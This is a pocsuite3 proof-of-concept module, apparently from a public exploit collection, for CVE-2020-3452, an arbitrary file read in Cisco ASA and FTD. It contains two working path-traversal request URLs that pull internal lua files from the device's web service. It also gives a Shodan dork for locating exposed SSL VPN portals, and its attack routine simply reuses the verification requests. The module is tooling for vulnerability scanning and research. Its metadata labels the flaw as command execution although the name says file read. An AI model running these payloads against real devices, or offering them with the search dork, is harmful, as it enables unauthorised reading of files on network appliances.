"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
import re
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, VUL_TYPE
from pocsuite3.lib.utils import random_str


class CiscoPOC(POCBase):
    vulID = '98295'  # ssvid
    version = '1.0'
    author = ['z3r0yu']
    vulDate = '2020-07-23'
    createDate = '2020-07-23'
    updateDate = '2020-07-23'
    references = ['https://www.anquanke.com/post/id/211543']
    name = 'CVE-2020-3452：Cisco ASA/FTD Arbitrary File Read'
    appPowerLink = 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86'
    appName = 'Cisco ASA software and FTD software'
    appVersion = '''
    Cisco ASA：<= 9.6
    Cisco ASA：9.7 , 9.8 , 9.9 , 9.10 , 9.12 , 9.13 , 9.14
    Cisco FTD：6.2.2 , 6.2.3 , 6.3.0 , 6.4.0 , 6.5.0 , 6.6.0
    '''
    vulType = VUL_TYPE.COMMAND_EXECUTION
    desc = '''
    https://www.seebug.org/vuldb/ssvid-98295
    https://www.anquanke.com/post/id/211543

    shodan dork
    title:"SSL VPN Service" "webvpnlogin=1"
    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        # print(self.url)
        url = self.url
        # print(url)

        try:
            poc1 = '{}/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'
            poc2 = '{}/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua'

            resp_poc1 = requests.get(poc1.format(url), verify=False, timeout=5)
            resp_poc2 = requests.get(poc2.format(url), verify=False, timeout=5)

            # flag = random_str(length=10)

            if ('common.lua' in resp_poc1.text) or ('browser_inc.lua' in resp_poc1.text):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['PoC'] = poc1.format('')
            elif ('common.lua' in resp_poc2.text) or ('browser_inc.lua' in resp_poc2.text):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['PoC'] = poc2.format('')
        except Exception as ex:
            logger.error(str(ex))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(CiscoPOC)
